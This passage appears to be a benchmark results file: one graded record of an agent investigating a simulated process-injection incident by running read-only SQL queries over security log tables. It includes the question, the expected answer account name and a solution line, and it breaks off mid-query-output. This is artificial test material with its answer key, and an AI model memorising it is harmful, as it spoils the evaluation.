@@ -1,0 +1,847 @@
+[
+    {
+        "success": true,
+        "steps": 8,
+        "reward": 1,
+        "success_query_count": 7,
+        "total_query_count": 7,
+        "question": {
+            "context": "A security incident involving a suspicious process injection was observed on host `vnevado-win11a`. A file `notepad.exe` was executed with process ID 8932 on this host. It was reported that a process injected code into another process, which might be an attempt to hide malicious code execution within a trusted process.",
+            "question": "Can you identify the name of the account associated with this suspicious activity?",
+            "answer": "nathans",
+            "solution": [
+                "The user account `nathans` was involved in an incident where suspicious process injection was observed."
+            ],
+            "start_alert": 10,
+            "end_alert": 10,
+            "start_entities": [
+                4,
+                8,
+                9,
+                13,
+                3,
+                12,
+                2,
+                11
+            ],
+            "end_entities": [
+                1
+            ],
+            "shortest_alert_path": [
+                10
+            ]
+        },
+        "trajectory": [
+            {
+                "action": "SHOW TABLES",
+                "observation": "[('AADManagedIdentitySignInLogs',), ('AADNonInteractiveUserSignInLogs',), ('AADServicePrincipalSignInLogs',), ('AZFWApplicationRule',), ('AZFWApplicationRuleAggregation',), ('AZFWDnsQuery',), ('AZFWIdpsSignature',), ('AZFWNetworkRule',), ('AZFWNetworkRuleAggregation',), ('AlertEvidence',), ('AlertInfo',), ('AuditLogs',), ('AzureMetrics',), ('CloudAppEvents',), ('DeviceEvents',), ('DeviceFileCertificateInfo',), ('DeviceFileEvents',), ('DeviceImageLoadEvents',), ('DeviceInfo',), ('DeviceLogonEvents',), ('DeviceNetworkEvents',), ('DeviceNetworkInfo',), ('DeviceProcessEvents',), ('DeviceRegistryEvents',), ('EmailAttachmentInfo',), ('EmailEvents',), ('EmailUrlInfo',), ('Heartbeat',), ('IdentityDirectoryEvents',), ('IdentityLogonEvents',), ('IdentityQueryEvents',), ('MicrosoftAzureBastionAuditLogs',), ('MicrosoftGraphActivityLogs',), ('SecurityAlert',), ('SecurityIncident',), ('SigninLogs',), ('ThreatIntelligenceIndicator',), ('Usage',)]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "DESCRIBE DeviceProcessEvents",
+                "observation": "[('TenantId', 'text', 'YES', '', None, ''), ('AccountDomain', 'text', 'YES', '', None, ''), ('AccountName', 'text', 'YES', '', None, ''), ('AccountObjectId', 'text', 'YES', '', None, ''), ('AccountSid', 'text', 'YES', '', None, ''), ('AccountUpn', 'text', 'YES', '', None, ''), ('ActionType', 'text', 'YES', '', None, ''), ('AdditionalFields', 'text', 'YES', '', None, ''), ('AppGuardContainerId', 'text', 'YES', '', None, ''), ('DeviceId', 'text', 'YES', '', None, ''), ('DeviceName', 'text', 'YES', '', None, ''), ('FileName', 'text', 'YES', '', None, ''), ('FolderPath', 'text', 'YES', '', None, ''), ('FileSize', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountDomain', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountName', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountObjectId', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountSid', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountUpn', 'text', 'YES', '', None, ''), ('InitiatingProcessCommandLine', 'text', 'YES', '', None, ''), ('InitiatingProcessFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessFolderPath', 'text', 'YES', '', None, ''), ('InitiatingProcessId', 'text', 'YES', '', None, ''), ('InitiatingProcessIntegrityLevel', 'text', 'YES', '', None, ''), ('InitiatingProcessLogonId', 'text', 'YES', '', None, ''), ('InitiatingProcessMD5', 'text', 'YES', '', None, ''), ('InitiatingProcessParentFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessParentId', 'text', 'YES', '', None, ''), ('InitiatingProcessSHA1', 'text', 'YES', '', None, ''), ('InitiatingProcessSHA256', 'text', 'YES', '', None, ''), ('InitiatingProcessTokenElevation', 'text', 'YES', '', None, ''), ('InitiatingProcessFileSize', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoCompanyName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoProductName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoProductVersion', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoInternalFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoOriginalFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoFileDescription', 'text', 'YES', '', None, ''), ('LogonId', 'text', 'YES', '', None, ''), ('MD5', 'text', 'YES', '', None, ''), ('MachineGroup', 'text', 'YES', '', None, ''), ('ProcessCommandLine', 'text', 'YES', '', None, ''), ('ProcessCreationTime', 'text', 'YES', '', None, ''), ('ProcessId', 'text', 'YES', '', None, ''), ('ProcessIntegrityLevel', 'text', 'YES', '', None, ''), ('ProcessTokenElevation', 'text', 'YES', '', None, ''), ('ProcessVersionInfoCompanyName', 'text', 'YES', '', None, ''), ('ProcessVersionInfoProductName', 'text', 'YES', '', None, ''), ('ProcessVersionInfoProductVersion', 'text', 'YES', '', None, ''), ('ProcessVersionInfoInternalFileName', 'text', 'YES', '', None, ''), ('ProcessVersionInfoOriginalFileName', 'text', 'YES', '', None, ''), ('ProcessVersionInfoFileDescription', 'text', 'YES', '', None, ''), ('InitiatingProcessSignerType', 'text', 'YES', '', None, ''), ('InitiatingProcessSignatureStatus', 'text', 'YES', '', None, ''), ('ReportId', 'text', 'YES', '', None, ''), ('SHA1', 'text', 'YES', '', None, ''), ('SHA256', 'text', 'YES', '', None, ''), ('TimeGenerated', 'text', 'YES', '', None, ''), ('Timestamp', 'text', 'YES', '', None, ''), ('InitiatingProcessParentCreationTime', 'text', 'YES', '', None, ''), ('InitiatingProcessCreationTime', 'text', 'YES', '', None, ''), ('SourceSystem', 'text', 'YES', '', None, ''), ('Type', 'text', 'YES', '', None, '')]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT InitiatingProcessAccountName, AccountName FROM DeviceProcessEvents WHERE DeviceName = 'vnevado-win11a' AND FileName = 'notepad.exe' AND ProcessId = 8932",
+                "observation": "[]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT DISTINCT ActionType FROM DeviceProcessEvents WHERE DeviceName = 'vnevado-win11a'",
+                "observation": "[]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT DeviceName FROM DeviceProcessEvents WHERE DeviceName LIKE '%vnevado-win11a%'",
+                "observation": "[('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), 